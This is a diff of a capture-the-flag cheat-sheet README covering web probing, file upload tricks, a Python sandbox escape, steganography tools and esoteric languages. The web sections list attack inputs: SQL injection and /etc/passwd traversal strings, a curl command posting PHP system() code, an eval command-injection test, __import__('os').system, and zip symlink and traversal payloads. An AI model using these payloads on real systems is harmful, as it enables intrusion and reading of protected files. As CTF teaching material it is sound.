@@ -1,10 +1,16 @@
 # CTF Candy
 
+My goal of this repository is to create a good and up to date cheat sheet for Capture the flag events and computer security.
+
+The one thing I hate the most is when I try a lot of different things and forgot about a simple one. This is what I aim to change!
+
+I will also try to update this repository frequently. Pull requests are welcome
+
 ## Web
 Web challenges can often by tricky. Sometimes you have no clue what to do.
 A good recommendation is try to find stuff that is out of the ordinary.
 
-#### Useful tools to begin with
+*Useful tools to begin with*
 
 * ZAP
 * Burpsuite
@@ -13,14 +19,22 @@ A good recommendation is try to find stuff that is out of the ordinary.
 
 #### Injection in GET parameter
 Here you have to manually try to enter some stuff to understand more about the application.
+
 * `?id='`
         Test for SQL injection
+
 * `?page[]=`
         Send an array, this might crash or reveal debug information about the error. Sometimes you might even get the source code of the application.
+
 * `?id=-1`
         Try negative numbers
+
+* `?id=99999999999999999999999999` or `?id=-999999999999999999999999`
+        Try both positive and negative numbers
+
 * `?page=../../../../etc/passwd`
         Local file inclusion (LFI)
+
 * `?page=../html/index`
         If you the above line does not work. Try this as you could be dealing with a limited local file inclusion.
     The code could look like this in php:
@@ -28,6 +42,7 @@ Here you have to manually try to enter some stuff to understand more about the a
     <?php
         include $_GET['page'] . '.php';
     ```
+
 * `?page=http://remote-file.js`
         Remote file inclusion
 
@@ -37,17 +52,44 @@ Here you have to manually try to enter some stuff to understand more about the a
 * `$ curl -d "<?=system('ls .')" -X POST http://URL/?magic=php://input`
         Send a arbitrary payload through a post request
 
+* `Big payload size`
+        This will often lead to a 500 internal error message, and might sometimes reveal information about the application and/or webserver.
+
+* `?exec=5*5`
+
+        If it returns *25* we have  `command injection`.
+        Backend is probably running :
+
+        eval($_GET['exec'])
+
 #### Form data
 
-* Hidden form input
+* `Hidden form field` - If you find something like this, throw everything you got at the debug parameter, this is often a simple command injection.
     ```html
     <input type="hidden" name ="debug" />
     ```
-* `?exec=5*5`
-        If it returns `25` we have  `command injection`.
-        Backend is probably running :
 
-        eval($_GET['exec'])`
+
+
+#### Python sandbox escape
+
+(This section is uncomplete)
+
+* `locals()`
+* `dir()`
+* `input()`
+* `__import__("os").system("ls .")`
+
+        This one is special in python 2. It will eval all user input.
+
+* Single quote and double quotes blocked? Use only numbers and parentheses.
+        ```python
+        def convertstr(payload):
+            output = ""
+            for i in payload:
+                output+= "chr(%d)+" % ord(i)
+            return output[:-1]
+        ```
 
 #### Page source
 The source of the page often includes hints where to look. Use developer tools!
@@ -61,18 +103,30 @@ The source of the page often includes hints where to look. Use developer tools!
     <!-- debug -->
     ```
 
-#### Attack functionality
-* [File upload](https://www.owasp.org/index.php/Unrestricted_File_Upload)
-    * Try a lot of different extensions'
-    * Double extension `.png.php`
-    * `command injecton` in filename
-    * Add PHP code to gif
-    ```bash
-    gifsicle < mygif.gif -- comment "<?=phpversion();?>" > output.php.gif
-    ```
+#### File upload
 
-* Money transfer
-        These are often a `timing attack`
+* https://www.owasp.org/index.php/Unrestricted_File_Upload
+* What kind of extensions does the website allow?
+* Can you find the url of the uploaded file?
+* Double extension `.png.php`?
+* `command injecton` in filename?
+* Try append PHP code at the end of an image
+* Spoof mime type of image?
+
+Automatic archive unzipping:
+
+* Can you upload a symbolic link inside a ZIP?
+        ```bash
+        $ ln -s ../../flag.txt test.txt
+        $ zip --symlinks symbolic.zip test.txt
+        ```
+* Directory traversal by uploading a relative file?
+        ```bash
+        $ zip payload.zip ../../../shell.php
+        ```
+
+#### Money transfer
+        These are often a `timing attack/side channel attack`
 
 #### Other
 
@@ -115,51 +169,19 @@ Use your favorite `fuzzer`. Here are some good ones:
 
 
 ## Esoteric Languages (ESO Lang)
-* https://esolangs.org/wiki/language_list
+* Wiki: https://esolangs.org/wiki/language_list
 
         Esoteric programming languages wiki! Great resource
 
-* https://tio.run/
+* Interpreter: https://tio.run/
 
         "Tio is a online interpreters for an evergrowing list of practical and recreational programming languages."
 
-* [https://esolangs.org/wiki/Hello_world](https://esolangs.org/wiki/Hello_world_program_in_esoteric_languages)
+* Hello world: [https://esolangs.org/wiki/Hello_world](https://esolangs.org/wiki/Hello_world_program_in_esoteric_languages)
 
-        This is a good resource to find examples of a lot of esoteric languages.
+        This is a good resource to find examples of a lot of esoteric languages. Take a lot here and see if one looks like the cipher text you got.
 
-### Examples of common esolangs
-
-* [Brainfuck](https://www.dcode.fr/brainfuck-language)
-
-        ```
-        ++++++++++[>+>+++>+++++++>++++++++++<<<<-]>>>>.<---.>+++++++++++.-----------.+.<<++.>-.>+++++++++++++.-----------------.++++++++.+++++.--------.+++++++++++++++.------------------.++++++++.
-        ```
-
-* [Malbogne](http://www.malbolge.doleczek.pl/)
-
-        ```(=<`#9]~6ZY32Vx/4Rs+0No-&Jk)"Fh}|Bcy?`=*z]Kw%oG4UUS0/@-ejc(:'8dc```
-
-* [Piet](https://www.bertnase.de/npiet/npiet-execute.php)
-
-    ![alt text](images/piet.gif "Piet")
-
-* [JSFuck](http://codertab.com/JsUnFuck)
-
-    [][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]][([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]]((![]+[])[+!+[]]+(![]+[])[!+[]+!+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]+(!![]+[])[+[]]+(![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[!+[]+!+[]+[+[]]]+[+!+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[!+[]+!+[]+[+[]]])()
-
-* [Whitespace](https://vii5ard.github.io/whitespace/)
-
-    ![alt text](images/whitespace.png "Piet")
-
-* [Emojicode](https://www.emojicode.org/docs/guides/install.html)
-
-        🏁 🍇
-        😀 🔤Hey!🔤❗️
-        🍉
-
-* [Befunge-93](http://www.quirkster.com/iano/js/befunge.html)
-
-        2>:3g" "-!v\  g30          <  |!`"O":+1_:.:03p>03g+:"O"`|  @               ^  p3\" ":<
+#### Variants of esolangs
 * [Ook]()
 
         Ook. Ook? Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook.
@@ -170,9 +192,37 @@ Use your favorite `fuzzer`. Here are some good ones:
 
 ## Steganography
 
-* stegsolve.jar
+* `strings` - Look for clues in strings.
+
+* `exiftool` - Check metadata
+
+* `file` - What file(s) are we working with? Sometimes the extension is not the correct one. Always worth checking
+
+* `stegsolve.jar` - Awesome stegnography tool, java based.
+
+    ```bash
+    $ java -jar stegsolve.jar
+    ```
+
+* `stegdetect` - Detect stegnography
+
+* `zsteg` - LSB stegnography
+    
+    ```bash
+    $ zsteg -a bojack.png 
+    b1,g,lsb,xy         .. file: JPEG image data, JFIF standard 1.01, resolution (DPI), density 300x300, segment length 16, baseline, precision 8, 182x268, frames 
+    ...
+    $ zsteg -E b1,g,lsb,xy bojack.png > output.jpg
+    ```
+
+* `Increase height and width of image`
+
+
+### Other tools
 
 * Steghide
+
+* [StegoMagic](https://github.com/MrMugiwara/StegoMagic)
 
 * StegCracker
 
@@ -180,11 +230,7 @@ Use your favorite `fuzzer`. Here are some good ones:
 
 * stegoVeritas
 
-* stegdetect
-
 * stegbreak
-
-* zsteg
 
 * jsteg
 
@@ -360,6 +406,22 @@ Use your favorite `fuzzer`. Here are some good ones:
 * /dev/random - Might sometimes return nullbyte(\00)
 
 * Shell in another challenge? Use it for recon
+
+* https://blog.sheddow.xyz/css-timing-attack/
+
+* MQTT
+
+* http://libcdb.com/
+
+* https://github.com/david942j/one_gadget
+
+* https://blog.sheddow.xyz/css-timing-attack/
+
+* https://github.com/ChrisTheCoolHut/PinCTF
+
+* pwn template
+
+* https://github.com/BuddhaLabs/PacketStorm-Exploits/blob/master/0101-exploits/unicode_shell.pl
 
 Sources of inspiration:
 * https://github.com/JohnHammond/ctf-katana/blob/master/README.md
